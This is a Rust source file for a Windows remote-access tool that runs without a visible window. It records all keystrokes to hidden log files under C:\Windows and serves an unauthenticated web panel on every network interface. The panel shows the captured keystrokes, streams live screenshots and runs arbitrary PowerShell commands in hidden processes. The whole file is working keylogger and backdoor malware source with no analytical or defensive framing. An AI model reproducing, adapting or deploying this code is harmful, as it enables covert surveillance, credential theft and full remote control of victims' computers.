#![windows_subsystem = "windows"]
use axum::{
    Router,
    extract::ws::{Message, WebSocketUpgrade},
    response::Html,
    routing::{get, post},
    serve,
};
use axum_extra::extract::Form;
use device_query::{DeviceEvents, DeviceEventsHandler};
use enigo::{Enigo, Keyboard, Settings};
use rdev::listen;
use std::{
    env::args,
    fs::OpenOptions,
    io::{Cursor, Read, Seek, SeekFrom, Write},
    os::windows::fs::OpenOptionsExt,
    sync::{Arc, Mutex},
};
use tokio::{
    fs::{remove_dir_all, remove_file, symlink_metadata},
    net::TcpListener,
    process::Command,
    spawn,
    time::Duration,
};
use xcap::{Monitor, image::ImageFormat};
const FORM: &'static str = r#"<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MTCGAGA</title>
    <script>
        // 更新 input 的 name 为下拉框选中的值
        function updateName(select) {
            const input = select.parentElement.querySelector('input[type="text"]');
            if (input)
                input.name = select.value;
        }
        // 在当前项之后插入一个新项
        function addAfter(btn) {
            const currentItem = btn.parentElement;          // 当前所在的 <div>
            const form = document.querySelector('form');    // 获取表单
            const div = document.createElement('div');
            div.innerHTML = `
                <select onchange="updateName(this)">
                    <option value="cmd">运行 Powershell 命令</option>
                    <option value="clr">清空按键记录</option>
                    <option value="txt">键入文本</option>
                    <option value="mre">鼠标相对移动</option>
                    <option value="mab">鼠标绝对移动</option>
                    <option value="sli">滑动鼠标滚轮</option>
                    <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
                    <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
                </select>
                <input type="text" placeholder="请输入参数……">
                <button type="button" onclick="addAfter(this)">添加</button>
                <button type="button" onclick="removeItem(this)">删除</button>
            `;
            form.insertBefore(div, currentItem.nextSibling);
            // 初始化新项的 input.name
            const newSelect = div.querySelector('select');
            const newInput = div.querySelector('input[type="text"]');
            if (newSelect && newInput) {
                newInput.name = newSelect.value;
            }
        }
        // 删除当前项，但至少保留一项
        function removeItem(btn) {
            const item = btn.parentElement;
            const form = document.querySelector('form');
            const items = form.querySelectorAll('div');
            if (items.length > 1) {
                item.remove();
            } else {
                alert('至少保留一项');
            }
        }

        // 页面加载后，初始化所有现有项的 input.name
        window.onload = function() {
            document.querySelectorAll('form div select').forEach(select => {
                updateName(select);
            });
        };
    </script>
</head>
<body>
    <form action="/" method="post">
        <!-- 初始项 -->
        <div>
            <select onchange="updateName(this)">
                <option value="cmd">运行 Powershell 命令</option>
                <option value="clr">清空按键记录</option>
                <option value="txt">键入文本</option>
                <option value="mre">鼠标相对移动</option>
                <option value="mab">鼠标绝对移动</option>
                <option value="sli">滑动鼠标滚轮</option>
                <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
                <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
            </select>
            <input type="text" name="cmd" placeholder="请输入参数……">
            <button type="button" onclick="addAfter(this)">添加</button>
            <button type="button" onclick="removeItem(this)">删除</button>
        </div>
        <button type="submit">提交</button>
    </form>
    <pre style="white-space:pre-wrap">"#;
const IMAGE: &'static str = r#"</pre>
<img src='screen.bmp'>
<script>
    const ws = new WebSocket('screen.bmp');
    const img = document.querySelector('img');
    ws.onmessage = (e) => {
        if (e.data instanceof Blob)
            img.src = URL.createObjectURL(event.data)
    }
</script>
</body>
</html>"#;
#[tokio::main]
async fn main() {
    let mut arg = args();
    arg.next();
    let lock = Arc::new(Mutex::new(
        OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .attributes(2)
            .open("C:\\Windows\\opt.log")
            .unwrap(),
    ));
    let lock1 = lock.clone();
    let lock2 = lock.clone();
    let lck = Arc::new(Mutex::new(
        OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .attributes(2)
            .open("C:\\Windows\\full.log")
            .unwrap(),
    ));
    let lck1 = lck.clone();
    let lck2 = lck.clone();
    let lck3 = lck.clone();
    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));
    let _down = handler.on_key_down(move |key| {
        let mut f = lck2.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2193; ").as_bytes()).unwrap();
    });
    let _up = handler.on_key_up(move |key| {
        let mut f = lck3.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2191; ").as_bytes()).unwrap();
    });
    spawn(async move {
        loop {
            let l = lock2.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    let mut f = l.lock().unwrap();
                    f.seek(SeekFrom::End(0)).unwrap();
                    f.write(
                        match &name[..] {
                            "&" => "&amp;",
                            "<" => "&lt;",
                            others => others,
                        }
                        .as_bytes(),
                    )
                    .unwrap();
                }
            })
            .unwrap();
        }
    });
    serve(
        TcpListener::bind("0.0.0.0:".to_string() + &arg.next().unwrap_or("1145".to_string()))
            .await
            .unwrap(),
        Router::new()
            .route(
                "/",
                post(async move |Form(frm): Form<Vec<(String, String)>>| {
                    for (a, b) in frm {
                        match &a[..] {
                            "cmd" => {
                                Command::new("powershell")
                                    .creation_flags(0x08000000)
                                    .arg("-Command")
                                    .arg(&b)
                                    .spawn()
                                    .unwrap();
                            }
                            "clr" => {
                                let mut f = lck.lock().unwrap();
                                let mut g = lock.lock().unwrap();
                                f.set_len(0).unwrap();
                                g.set_len(0).unwrap();
                                f.seek(SeekFrom::Start(0)).unwrap();
                                g.seek(SeekFrom::Start(0)).unwrap();
                            }
                            "txt" => enigo.lock().unwrap().text(&b).unwrap(),
                            // TODO
                            _ => (),
                        }
                    }
                    Html("<script>window.location.href=''</script>")
                })
                .get(async move || {
                    let mut f = lck1.lock().unwrap();
                    let mut g = lock1.lock().unwrap();
                    f.seek(SeekFrom::Start(0)).unwrap();
                    g.seek(SeekFrom::Start(0)).unwrap();
                    let mut s = String::new();
                    let mut t = String::new();
                    f.read_to_string(&mut s).unwrap();
                    g.read_to_string(&mut t).unwrap();
                    Html(FORM.to_string() + &s + "<hr>" + &t + IMAGE)
                }),
            )
            .route(
                "/screen.bmp",
                get(async |ws: WebSocketUpgrade| {
                    ws.on_upgrade(async |mut sk| {
                        loop {
                            let mut buf = Cursor::new(Vec::new());
                            Monitor::all().unwrap()[0]
                                .capture_image()
                                .unwrap()
                                .write_to(&mut buf, ImageFormat::Bmp)
                                .unwrap();
                            sk.send(Message::from(buf.into_inner())).await.unwrap();
                        }
                    })
                }),
            ),
    )
    .await
    .unwrap();
}
